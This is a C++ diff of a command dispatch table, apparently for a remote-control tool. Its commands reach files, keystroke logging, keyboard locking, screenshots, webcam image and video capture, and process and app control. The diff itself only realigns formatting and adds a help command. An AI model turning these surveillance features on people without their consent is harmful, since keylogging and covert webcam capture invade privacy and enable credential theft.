@@ -3,31 +3,34 @@
 map<string, map<string, pair<int, Function>>> requestTree = {
     {"file", {
         {"explore", {1, [](vector<string> params) { return showTree(params[0]); }}},
-        {"copy", {2, [](vector<string> params) { return copyFile(params[0], params[1]); }}},
-        {"get", {1, [](vector<string> params) { return getFile(params[0]); }}},
-        {"deletebin", {1, [](vector<string> params) { return deleteFileToBin(params[0]); }}},
-        {"deletepmn", {1, [](vector<string> params) { return deleteFilePermanently(params[0]); }}}
+        {"copy",    {2, [](vector<string> params) { return copyFile(params[0], params[1]); }}},
+        {"get",     {1, [](vector<string> params) { return getFile(params[0]); }}},
+        {"deletebin",   {1, [](vector<string> params) { return deleteFileToBin(params[0]); }}},
+        {"deletepmn",   {1, [](vector<string> params) { return deleteFilePermanently(params[0]); }}}
     }},
     {"key", {
-        {"log", {1, [](vector<string> params) { return getKeyLog(stoi(params[0])); }}},
-        {"lock", {1, [](vector<string> params) { return keyLock(stoi(params[0])); }}}
+        {"log",     {1, [](vector<string> params) { return getKeyLog(stoi(params[0])); }}},
+        {"lock",    {1, [](vector<string> params) { return keyLock(stoi(params[0])); }}}
     }},
     {"screen", {
-        {"get", {0, [](vector<string> params) { return getScreenshot("screenshot.png"); }}}
+        {"get",     {0, [](vector<string> params) { return getScreenshot("screenshot.png"); }}}
     }},
     {"webcam", {
-        {"getimg", {0, [](vector<string> params) { return getImage("image.jpg"); }}},
-        {"getvid", {1, [](vector<string> params) { return getVideo("video.avi", stoi(params[0])); }}}
+        {"getimg",  {0, [](vector<string> params) { return getImage("image.jpg"); }}},
+        {"getvid",  {1, [](vector<string> params) { return getVideo("video.avi", stoi(params[0])); }}}
     }},
     {"process", {
-        {"list", {0, [](vector<string> params) { return listProcess(); }}},
-        {"start", {1, [](vector<string> params) { return startProcess(params[0]); }}}, 
-        {"stop", {1, [](vector<string> params) { return stopProcess(stoi(params[0])); }}} 
+        {"list",    {0, [](vector<string> params) { return listProcess(); }}},
+        {"start",   {1, [](vector<string> params) { return startProcess(params[0]); }}}, 
+        {"stop",    {1, [](vector<string> params) { return stopProcess(stoi(params[0])); }}} 
     }},
     {"app", {
-        {"list", {0, [](vector<string> params) { return listApp(); }}},
-        {"start", {1, [](vector<string> params) { return startApp(params[0]); }}}, 
-        {"stop", {1, [](vector<string> params) { return stopApp(stoi(params[0])); }}} 
+        {"list",    {0, [](vector<string> params) { return listApp(); }}},
+        {"start",   {1, [](vector<string> params) { return startApp(params[0]); }}}, 
+        {"stop",    {1, [](vector<string> params) { return stopApp(stoi(params[0])); }}} 
+    }},
+    {"help", {
+        {"get",     {0, [](vector<string> params) { return showHelp(); }}}
     }}
 };
 
